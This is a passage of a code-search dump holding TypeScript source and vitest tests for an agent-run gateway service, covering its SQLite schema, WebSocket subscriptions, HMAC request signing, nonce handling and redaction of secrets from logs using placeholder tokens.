NOT NULL,\n        created_at INTEGER NOT NULL DEFAULT (unixepoch())\n      );\n      CREATE INDEX IF NOT EXISTS idx_artifacts_run_id ON artifacts(run_id);\n\n      CREATE TABLE IF NOT EXISTS nonces (\n        nonce TEXT PRIMARY KEY,\n        created_at INTEGER NOT NULL DEFAULT (unixepoch())\n      );\n      CREATE INDEX IF NOT EXISTS idx_nonces_created_at ON nonces(created_at);\n\n      CREATE TABLE IF NOT EXISTS users (\n        id TEXT PRIMARY KEY,\n        username TEXT UNIQUE NOT NULL,\n        password_hash TEXT,\n        totp_secret TEXT,\n        role TEXT NOT NULL DEFAULT 'viewer',\n        created_at INTEGER NOT NULL DEFAULT (unixepoch())\n      );\n\n      CREATE TABLE IF NOT EXISTS sessions (\n        id TEXT PRIMARY KEY,\n        user_id TEXT NOT NULL REFERENCES users(id) ON DELETE CASCADE,\n        created_at INTEGER NOT NULL DEFAULT (unixepoch()),\n        expires_at INTEGER NOT NULL\n      );\n\n      CREATE TABLE IF NOT EXISTS audit_log (\n        id INTEGER PRIMARY KEY AUTOINCREMENT,\n        user_id TEXT,\n        action TEXT NOT NULL,\n        target_type TEXT,\n        target_id TEXT,\n        details TEXT,\n        ip_address TEXT,\n        timestamp INTEGER NOT NULL DEFAULT (unixepoch())\n      );\n    `);\n  });\n\n  afterAll(() => {\n    db.close();\n    if (existsSync(testDir)) {\n      rmSync(testDir, { recursive: true });\n    }\n  });\n\n  beforeEach(() => {\n    // Clean tables between tests\n    db.exec('DELETE FROM events');\n    db.exec('DELETE FROM commands');\n    db.exec('DELETE FROM artifacts');\n    db.exec('DELETE FROM runs');\n    db.exec('DELETE FROM nonces');\n    db.exec('DELETE FROM sessions');\n    db.exec('DELETE FROM users');\n    db.exec('DELETE FROM audit_log');\n  });\n\n  describe('Runs Table', () => {\n    it('should create a run', () => {\n      const stmt = db.prepare(`\n        INSERT INTO runs (id, capability_token) VALUES (?, ?)\n      `);\n      stmt.run('test-run-1', 'test-token');\n\n      const run = db.prepare('SELECT * FROM runs WHERE id = ?').get('test-run-1') as any;\n      expect(run).toBeDefined();\n      expect(run.id).toBe('test-run-1');\n      expect(run.status).toBe('pending');\n      expect(run.capability_token).toBe('test-token');\n    });\n\n    it('should update run status', () => {\n      db.prepare('INSERT INTO runs (id, capability_token) VALUES (?, ?)').run('run-2', 'token');\n      db.prepare('UPDATE runs SET status = ?, started_at = unixepoch() WHERE id = ?').run('running', 'run-2');\n\n      const run = db.prepare('SELECT * FROM runs WHERE id = ?').get('run-2') as any;\n      expect(run.status).toBe('running');\n      expect(run.started_at).toBeGreaterThan(0);\n    });\n\n    it('should store metadata as JSON', () => {\n      const metadata = JSON.stringify({ key: 'value', count: 42 });\n      db.prepare('INSERT INTO runs (id, capability_token, metadata) VALUES (?, ?, ?)').run('run-3', 'token', metadata);\n\n      const run = db.prepare('SELECT metadata FROM runs WHERE id = ?').get('run-3') as any;\n      expect(JSON.parse(run.metadata)).toEqual({ key: 'value', count: 42 });\n    });\n  });\n\n  describe('Events Table', () => {\n    beforeEach(() => {\n      db.prepare('INSERT INTO runs (id, capability_token) VALUES (?, ?)').run('run-events', 'token');\n    });\n\n    it('should insert events with auto-increment id', () => {\n      db.prepare('INSERT INTO events (run_id, type, data) VALUES (?, ?, ?)').run('run-events', 'stdout', 'output');\n      db.prepare('INSERT INTO events (run_id, type, data) VALUES (?, ?, ?)').run('run-events', 'stderr', 'error');\n\n      const events = db.prepare('SELECT * FROM events WHERE run_id = ? ORDER BY id').all('run-events') as any[];\n      expect(events.length).toBe(2);\n      expect(events[0].id).toBeLessThan(events[1].id);\n    });\n\n    it('should cascade delete events when run is deleted', () => {\n      db.prepare('INSERT INTO events (run_id, type, data) VALUES (?, ?, ?)').run('run-events', 'stdout', 'test');\n\n      const before = db.prepare('SELECT COUNT(*) as count FROM events').get() as any;\n      expect(before.count).toBe(1);\n\n      db.prepare('DELETE FROM runs WHERE id = ?').run('run-events');\n\n      const after = db.prepare('SELECT COUNT(*) as count FROM events').get() as any;\n      expect(after.count).toBe(0);\n    });\n\n    it('should order events by sequence', () => {\n      db.prepare('INSERT INTO events (run_id, type, data, sequence) VALUES (?, ?, ?, ?)').run('run-events', 'stdout', 'first', 1);\n      db.prepare('INSERT INTO events (run_id, type, data, sequence) VALUES (?, ?, ?, ?)').run('run-events', 'stdout', 'third', 3);\n      db.prepare('INSERT INTO events (run_id, type, data, sequence) VALUES (?, ?, ?, ?)').run('run-events', 'stdout', 'second', 2);\n\n      const events = db.prepare('SELECT data FROM events WHERE run_id = ? ORDER BY sequence').all('run-events') as any[];\n      expect(events.map(e => e.data)).toEqual(['first', 'second', 'third']);\n    });\n  });\n\n  describe('Commands Table', () => {\n    beforeEach(() => {\n      db.prepare('INSERT INTO runs (id, capability_token) VALUES (?, ?)').run('run-cmds', 'token');\n    });\n\n    it('should insert commands', () => {\n      db.prepare('INSERT INTO commands (id, run_id, command) VALUES (?, ?, ?)').run('cmd-1', 'run-cmds', 'npm test');\n\n      const cmd = db.prepare('SELECT * FROM commands WHERE id = ?').get('cmd-1') as any;", "metadata": {"file": "gateway/src/services/database.test.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/services/database.test.ts", "location": "gateway/src/services/database.test.ts:201", "score": 0.0, "content": "      expect(cmd.command).toBe('npm test');\n      expect(cmd.status).toBe('pending');\n    });\n\n    it('should update command status on ack', () => {\n      db.prepare('INSERT INTO commands (id, run_id, command) VALUES (?, ?, ?)').run('cmd-2', 'run-cmds', 'git diff');\n      db.prepare(`\n        UPDATE commands SET status = 'completed', acked_at = unixepoch(), result = ? WHERE id = ?\n      `).run('diff output', 'cmd-2');\n\n      const cmd = db.prepare('SELECT * FROM commands WHERE id = ?').get('cmd-2') as any;\n      expect(cmd.status).toBe('completed');\n      expect(cmd.result).toBe('diff output');\n      expect(cmd.acked_at).toBeGreaterThan(0);\n    });\n  });\n\n  describe('Nonces Table', () => {\n    it('should enforce unique nonces', () => {\n      db.prepare('INSERT INTO nonces (nonce) VALUES (?)').run('nonce-1');\n\n      expect(() => {\n        db.prepare('INSERT INTO nonces (nonce) VALUES (?)').run('nonce-1');\n      }).toThrow();\n    });\n\n    it('should allow different nonces', () => {\n      db.prepare('INSERT INTO nonces (nonce) VALUES (?)').run('nonce-a');\n      db.prepare('INSERT INTO nonces (nonce) VALUES (?)').run('nonce-b');\n\n      const count = db.prepare('SELECT COUNT(*) as count FROM nonces').get() as any;\n      expect(count.count).toBe(2);\n    });\n\n    it('should cleanup old nonces', () => {\n      const old = Math.floor(Date.now() / 1000) - 7200; // 2 hours ago\n      db.prepare('INSERT INTO nonces (nonce, created_at) VALUES (?, ?)').run('old-nonce', old);\n      db.prepare('INSERT INTO nonces (nonce) VALUES (?)').run('new-nonce');\n\n      const cutoff = Math.floor(Date.now() / 1000) - 3600; // 1 hour ago\n      db.prepare('DELETE FROM nonces WHERE created_at < ?').run(cutoff);\n\n      const remaining = db.prepare('SELECT nonce FROM nonces').all() as any[];\n      expect(remaining.length).toBe(1);\n      expect(remaining[0].nonce).toBe('new-nonce');\n    });\n  });\n\n  describe('Users Table', () => {\n    it('should enforce unique usernames', () => {\n      db.prepare('INSERT INTO users (id, username, role) VALUES (?, ?, ?)').run('user-1', 'admin', 'admin');\n\n      expect(() => {\n        db.prepare('INSERT INTO users (id, username, role) VALUES (?, ?, ?)').run('user-2', 'admin', 'viewer');\n      }).toThrow();\n    });\n\n    it('should store password hash and totp secret', () => {\n      db.prepare(`\n        INSERT INTO users (id, username, password_hash, totp_secret, role)\n        VALUES (?, ?, ?, ?, ?)\n      `).run('user-3', 'testuser', 'hashed_password', 'totp_secret_here', 'operator');\n\n      const user = db.prepare('SELECT * FROM users WHERE id = ?').get('user-3') as any;\n      expect(user.password_hash).toBe('hashed_password');\n      expect(user.totp_secret).toBe('totp_secret_here');\n      expect(user.role).toBe('operator');\n    });\n  });\n\n  describe('Sessions Table', () => {\n    beforeEach(() => {\n      db.prepare('INSERT INTO users (id, username, role) VALUES (?, ?, ?)').run('user-sess', 'testuser', 'admin');\n    });\n\n    it('should create sessions with expiry', () => {\n      const expires = Math.floor(Date.now() / 1000) + 86400; // 24 hours from now\n      db.prepare('INSERT INTO sessions (id, user_id, expires_at) VALUES (?, ?, ?)').run('sess-1', 'user-sess', expires);\n\n      const session = db.prepare('SELECT * FROM sessions WHERE id = ?').get('sess-1') as any;\n      expect(session.user_id).toBe('user-sess');\n      expect(session.expires_at).toBe(expires);\n    });\n\n    it('should cascade delete sessions when user is deleted', () => {\n      db.prepare('INSERT INTO sessions (id, user_id, expires_at) VALUES (?, ?, ?)').run('sess-2', 'user-sess', 999999999);\n\n      db.prepare('DELETE FROM users WHERE id = ?').run('user-sess');\n\n      const session = db.prepare('SELECT * FROM sessions WHERE id = ?').get('sess-2');\n      expect(session).toBeUndefined();\n    });\n  });\n\n  describe('Audit Log', () => {\n    it('should record audit entries', () => {\n      db.prepare(`\n        INSERT INTO audit_log (user_id, action, target_type, target_id, details, ip_address)\n        VALUES (?, ?, ?, ?, ?, ?)\n      `).run('user-1', 'run.create', 'run', 'run-1', '{\"command\":\"test\"}', '127.0.0.1');\n\n      const log = db.prepare('SELECT * FROM audit_log').all() as any[];\n      expect(log.length).toBe(1);\n      expect(log[0].action).toBe('run.create');\n      expect(JSON.parse(log[0].details)).toEqual({ command: 'test' });\n    });\n\n    it('should order by timestamp', () => {\n      db.prepare('INSERT INTO audit_log (user_id, action, timestamp) VALUES (?, ?, ?)').run('u', 'first', 100);\n      db.prepare('INSERT INTO audit_log (user_id, action, timestamp) VALUES (?, ?, ?)').run('u', 'third', 300);\n      db.prepare('INSERT INTO audit_log (user_id, action, timestamp) VALUES (?, ?, ?)').run('u', 'second', 200);\n\n      const logs = db.prepare('SELECT action FROM audit_log ORDER BY timestamp DESC').all() as any[];\n      expect(logs.map(l => l.action)).toEqual(['third', 'second', 'first']);\n    });\n  });\n});", "metadata": {"file": "gateway/src/services/database.test.ts", "start_line": 201, "end_line": 317, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/services/database.ts", "location": "gateway/src/services/database.ts:1", "score": 0.0, "content": "import Database, { type Database as DatabaseType } from 'better-sqlite3';\nimport { config } from '../config.js';\nimport { mkdirSync, existsSync } from 'fs';\nimport { dirname } from 'path';\n\n// Ensure data directory exists\nconst dbDir = dirname(config.dbPath);\nif (!existsSync(dbDir)) {\n  mkdirSync(dbDir, { recursive: true });\n}\n\nexport const db: DatabaseType = new Database(config.dbPath);\n\n// Enable WAL mode for better concurrency\ndb.pragma('journal_mode = WAL');\ndb.pragma('foreign_keys = ON');\n\n// Initialize schema\ndb.exec(`\n  -- Clients table (machines/agents connecting to gateway)\n  CREATE TABLE IF NOT EXISTS clients (\n    id TEXT PRIMARY KEY,\n    display_name TEXT NOT NULL,\n    agent_id TEXT UNIQUE NOT NULL,\n    last_seen_at INTEGER NOT NULL DEFAULT (unixepoch()),\n    version TEXT,\n    capabilities TEXT,\n    status TEXT NOT NULL DEFAULT 'online',\n    operator_enabled INTEGER NOT NULL DEFAULT 1,\n    metadata TEXT,\n    created_at INTEGER NOT NULL DEFAULT (unixepoch())\n  );\n  CREATE INDEX IF NOT EXISTS idx_clients_agent_id ON clients(agent_id);\n  CREATE INDEX IF NOT EXISTS idx_clients_status ON clients(status);\n  CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen_at);\n\n  -- Runs table\n  CREATE TABLE IF NOT EXISTS runs (\n    id TEXT PRIMARY KEY,\n    client_id TEXT REFERENCES clients(id) ON DELETE SET NULL,\n    status TEXT NOT NULL DEFAULT 'pending',\n    label TEXT,\n    command TEXT,\n    repo_path TEXT,\n    repo_name TEXT,\n    waiting_approval INTEGER NOT NULL DEFAULT 0,\n    created_at INTEGER NOT NULL DEFAULT (unixepoch()),\n    started_at INTEGER,\n    finished_at INTEGER,\n    exit_code INTEGER,\n    error_message TEXT,\n    capability_token TEXT NOT NULL,\n    metadata TEXT,\n    tags TEXT,\n    worker_type TEXT NOT NULL DEFAULT 'claude'\n  );\n  CREATE INDEX IF NOT EXISTS idx_runs_client_id ON runs(client_id);\n  CREATE INDEX IF NOT EXISTS idx_runs_status ON runs(status);\n  CREATE INDEX IF NOT EXISTS idx_runs_created_at ON runs(created_at);\n  CREATE INDEX IF NOT EXISTS idx_runs_waiting_approval ON runs(waiting_approval);\n  CREATE INDEX IF NOT EXISTS idx_runs_worker_type ON runs(worker_type);\n\n  -- Migration: Add worker_type column if it doesn't exist\n  -- This is a no-op if the column already exists\n  -- ALTER TABLE runs ADD COLUMN worker_type TEXT NOT NULL DEFAULT 'claude';\n\n  -- Events table (log chunks, markers)\n  CREATE TABLE IF NOT EXISTS events (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    run_id TEXT NOT NULL REFERENCES runs(id) ON DELETE CASCADE,\n    type TEXT NOT NULL,\n    data TEXT,\n    step_id TEXT,\n    timestamp INTEGER NOT NULL DEFAULT (unixepoch()),\n    sequence INTEGER NOT NULL DEFAULT 0\n  );\n  CREATE INDEX IF NOT EXISTS idx_events_run_id ON events(run_id);\n  CREATE INDEX IF NOT EXISTS idx_events_timestamp ON events(timestamp);\n  CREATE INDEX IF NOT EXISTS idx_events_step_id ON events(step_id);\n\n  -- Commands table (UI -> wrapper)\n  CREATE TABLE IF NOT EXISTS commands (\n    id TEXT PRIMARY KEY,\n    run_id TEXT NOT NULL REFERENCES runs(id) ON DELETE CASCADE,\n    command TEXT NOT NULL,\n    status TEXT NOT NULL DEFAULT 'pending',\n    created_at INTEGER NOT NULL DEFAULT (unixepoch()),\n    acked_at INTEGER,\n    result TEXT,\n    error TEXT\n  );\n  CREATE INDEX IF NOT EXISTS idx_commands_run_id ON commands(run_id);\n  CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status);\n\n  -- Artifacts table\n  CREATE TABLE IF NOT EXISTS artifacts (\n    id TEXT PRIMARY KEY,\n    run_id TEXT NOT NULL REFERENCES runs(id) ON DELETE CASCADE,\n    name TEXT NOT NULL,\n    type TEXT NOT NULL,\n    size INTEGER NOT NULL,\n    path TEXT NOT NULL,\n    created_at INTEGER NOT NULL DEFAULT (unixepoch())\n  );\n  CREATE INDEX IF NOT EXISTS idx_artifacts_run_id ON artifacts(run_id);\n\n  -- Nonces for replay protection\n  CREATE TABLE IF NOT EXISTS nonces (\n    nonce TEXT PRIMARY KEY,\n    created_at INTEGER NOT NULL DEFAULT (unixepoch())\n  );\n  CREATE INDEX IF NOT EXISTS idx_nonces_created_at ON nonces(created_at);\n\n  -- Users table (for local auth fallback)\n  CREATE TABLE IF NOT EXISTS users (\n    id TEXT PRIMARY KEY,\n    username TEXT UNIQUE NOT NULL,\n    password_hash TEXT,\n    totp_secret TEXT,\n    role TEXT NOT NULL DEFAULT 'viewer',\n    created_at INTEGER NOT NULL DEFAULT (unixepoch())\n  );\n\n  -- Sessions table\n  CREATE TABLE IF NOT EXISTS sessions (\n    id TEXT PRIMARY KEY,\n    user_id TEXT NOT NULL REFERENCES users(id) ON DELETE CASCADE,\n    created_at INTEGER NOT NULL DEFAULT (unixepoch()),\n    expires_at INTEGER NOT NULL\n  );\n  CREATE INDEX IF NOT EXISTS idx_sessions_expires ON sessions(expires_at);\n\n  -- Audit log\n  CREATE TABLE IF NOT EXISTS audit_log (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    user_id TEXT,\n    action TEXT NOT NULL,\n    target_type TEXT,\n    target_id TEXT,\n    details TEXT,\n    ip_address TEXT,\n    timestamp INTEGER NOT NULL DEFAULT (unixepoch())\n  );\n  CREATE INDEX IF NOT EXISTS idx_audit_timestamp ON audit_log(timestamp);\n\n  -- Alert rules\n  CREATE TABLE IF NOT EXISTS alert_rules (\n    id TEXT PRIMARY KEY,\n    name TEXT NOT NULL,\n    type TEXT NOT NULL,\n    config TEXT NOT NULL,\n    enabled INTEGER NOT NULL DEFAULT 1,\n    created_at INTEGER NOT NULL DEFAULT (unixepoch())\n  );\n\n  -- Alerts (triggered notifications)\n  CREATE TABLE IF NOT EXISTS alerts (\n    id TEXT PRIMARY KEY,\n    rule_id TEXT REFERENCES alert_rules(id) ON DELETE SET NULL,\n    type TEXT NOT NULL,\n    severity TEXT NOT NULL DEFAULT 'info',\n    title TEXT NOT NULL,\n    message TEXT,\n    target_type TEXT,\n    target_id TEXT,\n    acknowledged INTEGER NOT NULL DEFAULT 0,\n    acknowledged_by TEXT,\n    acknowledged_at INTEGER,\n    created_at INTEGER NOT NULL DEFAULT (unixepoch())\n  );\n  CREATE INDEX IF NOT EXISTS idx_alerts_acknowledged ON alerts(acknowledged);\n  CREATE INDEX IF NOT EXISTS idx_alerts_created_at ON alerts(created_at);\n\n  -- UI preferences\n  CREATE TABLE IF NOT EXISTS user_preferences (\n    user_id TEXT PRIMARY KEY REFERENCES users(id) ON DELETE CASCADE,\n    dark_mode INTEGER NOT NULL DEFAULT 1,\n    autoscroll INTEGER NOT NULL DEFAULT 1,\n    compact_view INTEGER NOT NULL DEFAULT 0,\n    updated_at INTEGER NOT NULL DEFAULT (unixepoch())\n  );\n\n  -- Session state for resume/restart functionality\n  CREATE TABLE IF NOT EXISTS run_state (\n    run_id TEXT PRIMARY KEY REFERENCES runs(id) ON DELETE CASCADE,\n    working_dir TEXT NOT NULL,\n    original_command TEXT,\n    last_sequence INTEGER DEFAULT 0,\n    stdin_buffer TEXT,\n    environment TEXT,\n    updated_at INTEGER NOT NULL DEFAULT (unixepoch())\n  );\n`);\n\n// Helper functions\nexport function cleanupExpiredNonces(): number {\n  const cutoff = Math.floor(Date.now() / 1000) - config.nonceExpirySeconds;\n  const result = db.prepare('DELETE FROM nonces WHERE created_at < ?').run(cutoff);\n  return result.changes;\n}", "metadata": {"file": "gateway/src/services/database.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/services/database.ts", "location": "gateway/src/services/database.ts:201", "score": 0.0, "content": "\nexport function cleanupExpiredSessions(): number {\n  const now = Math.floor(Date.now() / 1000);\n  const result = db.prepare('DELETE FROM sessions WHERE expires_at < ?').run(now);\n  return result.changes;\n}\n\n// Update client status based on heartbeat\nexport function updateClientStatus(): number {\n  const now = Math.floor(Date.now() / 1000);\n  const offlineThreshold = now - 60; // 60 seconds without heartbeat = offline\n  const degradedThreshold = now - 30; // 30 seconds = degraded\n\n  // Mark clients as offline\n  const offlineResult = db.prepare(\n    \"UPDATE clients SET status = 'offline' WHERE last_seen_at < ? AND status != 'offline'\"\n  ).run(offlineThreshold);\n\n  // Mark clients as degraded\n  db.prepare(\n    \"UPDATE clients SET status = 'degraded' WHERE last_seen_at >= ? AND last_seen_at < ? AND status = 'online'\"\n  ).run(offlineThreshold, degradedThreshold);\n\n  // Mark clients as online\n  db.prepare(\n    \"UPDATE clients SET status = 'online' WHERE last_seen_at >= ? AND status != 'online'\"\n  ).run(degradedThreshold);\n\n  return offlineResult.changes;\n}\n\n// Run cleanup periodically\nsetInterval(() => {\n  cleanupExpiredNonces();\n  cleanupExpiredSessions();\n  updateClientStatus();\n}, 60000); // Every minute", "metadata": {"file": "gateway/src/services/database.ts", "start_line": 201, "end_line": 237, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/services/websocket.ts", "location": "gateway/src/services/websocket.ts:1", "score": 0.0, "content": "import type { FastifyInstance } from 'fastify';\nimport type { WebSocket } from 'ws';\nimport { db } from './database.js';\n\ninterface WSClient {\n  socket: WebSocket;\n  runId?: string;\n  userId?: string;\n  isAlive: boolean;\n}\n\nconst clients = new Map<WebSocket, WSClient>();\nconst runSubscriptions = new Map<string, Set<WebSocket>>();\n\n/**\n * Broadcast message to all subscribers of a run\n */\nexport function broadcastToRun(runId: string, message: object): void {\n  const subs = runSubscriptions.get(runId);\n  if (!subs) return;\n\n  const payload = JSON.stringify(message);\n  for (const socket of subs) {\n    if (socket.readyState === 1) { // OPEN\n      socket.send(payload);\n    }\n  }\n}\n\n/**\n * Broadcast to all connected clients\n */\nexport function broadcastAll(message: object): void {\n  const payload = JSON.stringify(message);\n  for (const [socket, client] of clients) {\n    if (socket.readyState === 1) {\n      socket.send(payload);\n    }\n  }\n}\n\n/**\n * Setup WebSocket handler\n */\nexport function setupWebSocket(fastify: FastifyInstance): void {\n  fastify.get('/ws', { websocket: true }, (connection, request) => {\n    const socket = connection;\n\n    const client: WSClient = {\n      socket,\n      isAlive: true\n    };\n    clients.set(socket, client);\n\n    // Handle incoming messages\n    socket.on('message', (data) => {\n      try {\n        const msg = JSON.parse(data.toString());\n\n        switch (msg.type) {\n          case 'subscribe':\n            if (msg.runId) {\n              // Verify run exists\n              const run = db.prepare('SELECT id FROM runs WHERE id = ?').get(msg.runId);\n              if (run) {\n                client.runId = msg.runId;\n                if (!runSubscriptions.has(msg.runId)) {\n                  runSubscriptions.set(msg.runId, new Set());\n                }\n                runSubscriptions.get(msg.runId)!.add(socket);\n                socket.send(JSON.stringify({ type: 'subscribed', runId: msg.runId }));\n              } else {\n                socket.send(JSON.stringify({ type: 'error', message: 'Run not found' }));\n              }\n            }\n            break;\n\n          case 'unsubscribe':\n            if (client.runId) {\n              const subs = runSubscriptions.get(client.runId);\n              if (subs) {\n                subs.delete(socket);\n                if (subs.size === 0) {\n                  runSubscriptions.delete(client.runId);\n                }\n              }\n              client.runId = undefined;\n              socket.send(JSON.stringify({ type: 'unsubscribed' }));\n            }\n            break;\n\n          case 'ping':\n            client.isAlive = true;\n            socket.send(JSON.stringify({ type: 'pong' }));\n            break;\n        }\n      } catch (err) {\n        // Ignore parse errors\n      }\n    });\n\n    // Handle pong for keep-alive\n    socket.on('pong', () => {\n      client.isAlive = true;\n    });\n\n    // Cleanup on close\n    socket.on('close', () => {\n      if (client.runId) {\n        const subs = runSubscriptions.get(client.runId);\n        if (subs) {\n          subs.delete(socket);\n          if (subs.size === 0) {\n            runSubscriptions.delete(client.runId);\n          }\n        }\n      }\n      clients.delete(socket);\n    });\n\n    // Send welcome message\n    socket.send(JSON.stringify({\n      type: 'connected',\n      message: 'WebSocket connected. Send { \"type\": \"subscribe\", \"runId\": \"<id>\" } to subscribe to run events.'\n    }));\n  });\n\n  // Keep-alive interval\n  const pingInterval = setInterval(() => {\n    for (const [socket, client] of clients) {\n      if (!client.isAlive) {\n        socket.terminate();\n        clients.delete(socket);\n        continue;\n      }\n      client.isAlive = false;\n      socket.ping();\n    }\n  }, 30000);\n\n  // Cleanup on server close\n  fastify.addHook('onClose', () => {\n    clearInterval(pingInterval);\n    for (const socket of clients.keys()) {\n      socket.close();\n    }\n    clients.clear();\n    runSubscriptions.clear();\n  });\n}\n\n/**\n * Get connection stats\n */\nexport function getConnectionStats(): { clients: number; subscriptions: number } {\n  return {\n    clients: clients.size,\n    subscriptions: runSubscriptions.size\n  };\n}", "metadata": {"file": "gateway/src/services/websocket.ts", "start_line": 1, "end_line": 160, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/utils/crypto.test.ts", "location": "gateway/src/utils/crypto.test.ts:1", "score": 0.0, "content": "import { describe, it, expect, beforeAll } from 'vitest';\nimport {\n  createSignature,\n  verifySignature,\n  hashBody,\n  generateNonce,\n  generateCapabilityToken,\n  isTimestampValid,\n  redactSecrets\n} from './crypto.js';\nimport { config } from '../config.js';\n\n// Set a test secret\nbeforeAll(() => {\n  config.hmacSecret = 'test-secret-key-that-is-long-enough-for-testing';\n});\n\ndescribe('HMAC Signature', () => {\n  const baseComponents = {\n    method: 'POST',\n    path: '/api/ingest/event',\n    bodyHash: hashBody('{\"type\":\"stdout\",\"data\":\"test\"}'),\n    timestamp: Math.floor(Date.now() / 1000),\n    nonce: generateNonce(),\n    runId: 'test-run-123',\n    capabilityToken: 'test-capability-token'\n  };\n\n  it('should create consistent signatures', () => {\n    const sig1 = createSignature(baseComponents);\n    const sig2 = createSignature(baseComponents);\n    expect(sig1).toBe(sig2);\n  });\n\n  it('should verify valid signatures', () => {\n    const signature = createSignature(baseComponents);\n    expect(verifySignature(signature, baseComponents)).toBe(true);\n  });\n\n  it('should reject invalid signatures', () => {\n    expect(verifySignature('invalid-signature', baseComponents)).toBe(false);\n  });\n\n  it('should reject tampered method', () => {\n    const signature = createSignature(baseComponents);\n    const tampered = { ...baseComponents, method: 'GET' };\n    expect(verifySignature(signature, tampered)).toBe(false);\n  });\n\n  it('should reject tampered path', () => {\n    const signature = createSignature(baseComponents);\n    const tampered = { ...baseComponents, path: '/api/other' };\n    expect(verifySignature(signature, tampered)).toBe(false);\n  });\n\n  it('should reject tampered body', () => {\n    const signature = createSignature(baseComponents);\n    const tampered = { ...baseComponents, bodyHash: hashBody('different body') };\n    expect(verifySignature(signature, tampered)).toBe(false);\n  });\n\n  it('should reject tampered timestamp', () => {\n    const signature = createSignature(baseComponents);\n    const tampered = { ...baseComponents, timestamp: baseComponents.timestamp + 1 };\n    expect(verifySignature(signature, tampered)).toBe(false);\n  });\n\n  it('should reject tampered nonce', () => {\n    const signature = createSignature(baseComponents);\n    const tampered = { ...baseComponents, nonce: 'different-nonce' };\n    expect(verifySignature(signature, tampered)).toBe(false);\n  });\n\n  it('should reject tampered runId', () => {\n    const signature = createSignature(baseComponents);\n    const tampered = { ...baseComponents, runId: 'different-run' };\n    expect(verifySignature(signature, tampered)).toBe(false);\n  });\n\n  it('should reject tampered capability token', () => {\n    const signature = createSignature(baseComponents);\n    const tampered = { ...baseComponents, capabilityToken: 'different-token' };\n    expect(verifySignature(signature, tampered)).toBe(false);\n  });\n\n  it('should reject signature with wrong secret', () => {\n    const signature = createSignature(baseComponents);\n    const originalSecret = config.hmacSecret;\n    config.hmacSecret = 'different-secret-key-for-testing';\n    expect(verifySignature(signature, baseComponents)).toBe(false);\n    config.hmacSecret = originalSecret;\n  });\n});\n\ndescribe('Timestamp Validation', () => {\n  it('should accept current timestamp', () => {\n    const now = Math.floor(Date.now() / 1000);\n    expect(isTimestampValid(now)).toBe(true);\n  });\n\n  it('should accept timestamp within skew', () => {\n    const now = Math.floor(Date.now() / 1000);\n    expect(isTimestampValid(now + 60)).toBe(true); // 1 minute in future\n    expect(isTimestampValid(now - 60)).toBe(true); // 1 minute in past\n  });\n\n  it('should reject timestamp outside skew', () => {\n    const now = Math.floor(Date.now() / 1000);\n    expect(isTimestampValid(now + 600)).toBe(false); // 10 minutes in future\n    expect(isTimestampValid(now - 600)).toBe(false); // 10 minutes in past\n  });\n});\n\ndescribe('Nonce Generation', () => {\n  it('should generate unique nonces', () => {\n    const nonces = new Set<string>();\n    for (let i = 0; i < 1000; i++) {\n      nonces.add(generateNonce());\n    }\n    expect(nonces.size).toBe(1000);\n  });\n\n  it('should generate hex strings', () => {\n    const nonce = generateNonce();\n    expect(nonce).toMatch(/^[a-f0-9]+$/);\n    expect(nonce.length).toBe(32); // 16 bytes = 32 hex chars\n  });\n});\n\ndescribe('Capability Token Generation', () => {\n  it('should generate unique tokens', () => {\n    const tokens = new Set<string>();\n    for (let i = 0; i < 100; i++) {\n      tokens.add(generateCapabilityToken());\n    }\n    expect(tokens.size).toBe(100);\n  });\n\n  it('should generate 64-char hex strings', () => {\n    const token = generateCapabilityToken();\n    expect(token).toMatch(/^[a-f0-9]+$/);\n    expect(token.length).toBe(64); // 32 bytes = 64 hex chars\n  });\n});\n\ndescribe('Body Hashing', () => {\n  it('should hash strings consistently', () => {\n    const hash1 = hashBody('test content');\n    const hash2 = hashBody('test content');\n    expect(hash1).toBe(hash2);\n  });\n\n  it('should produce different hashes for different content', () => {\n    const hash1 = hashBody('content 1');\n    const hash2 = hashBody('content 2');\n    expect(hash1).not.toBe(hash2);\n  });\n\n  it('should hash buffers', () => {\n    const hash = hashBody(Buffer.from('test'));\n    expect(hash).toMatch(/^[a-f0-9]{64}$/);\n  });\n});\n\ndescribe('Secret Redaction', () => {\n  it('should redact API keys', () => {\n    expect(redactSecrets('api_key=secret123')).toContain('[REDACTED]');\n    expect(redactSecrets('apiKey: secret123')).toContain('[REDACTED]');\n    expect(redactSecrets('API_KEY=\"mykey\"')).toContain('[REDACTED]');\n  });\n\n  it('should redact passwords', () => {\n    expect(redactSecrets('password=secret')).toContain('[REDACTED]');\n    expect(redactSecrets('PASSWORD: hunter2')).toContain('[REDACTED]');\n  });\n\n  it('should redact tokens', () => {\n    expect(redactSecrets('token=abc123')).toContain('[REDACTED]');\n    expect(redactSecrets('Bearer eyJhbGc...')).toContain('[REDACTED]');\n  });\n\n  it('should redact OpenAI keys', () => {\n    expect(redactSecrets('sk-abcdefghijklmnopqrstuvwxyz12345')).toContain('[REDACTED]');\n  });\n\n  it('should redact GitHub tokens', () => {\n    expect(redactSecrets('ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')).toContain('[REDACTED]');\n    expect(redactSecrets('ghs_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')).toContain('[REDACTED]');\n  });\n\n  it('should redact NPM tokens', () => {\n    expect(redactSecrets('npm_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')).toContain('[REDACTED]');\n  });\n\n  it('should not modify non-secret content', () => {\n    const safe = 'This is normal output with no secrets';\n    expect(redactSecrets(safe)).toBe(safe);\n  });\n\n  it('should preserve surrounding context', () => {", "metadata": {"file": "gateway/src/utils/crypto.test.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/utils/crypto.test.ts", "location": "gateway/src/utils/crypto.test.ts:201", "score": 0.0, "content": "    const result = redactSecrets('Before api_key=secret123 After');\n    expect(result).toContain('Before');\n    expect(result).toContain('After');\n    expect(result).toContain('[REDACTED]');\n    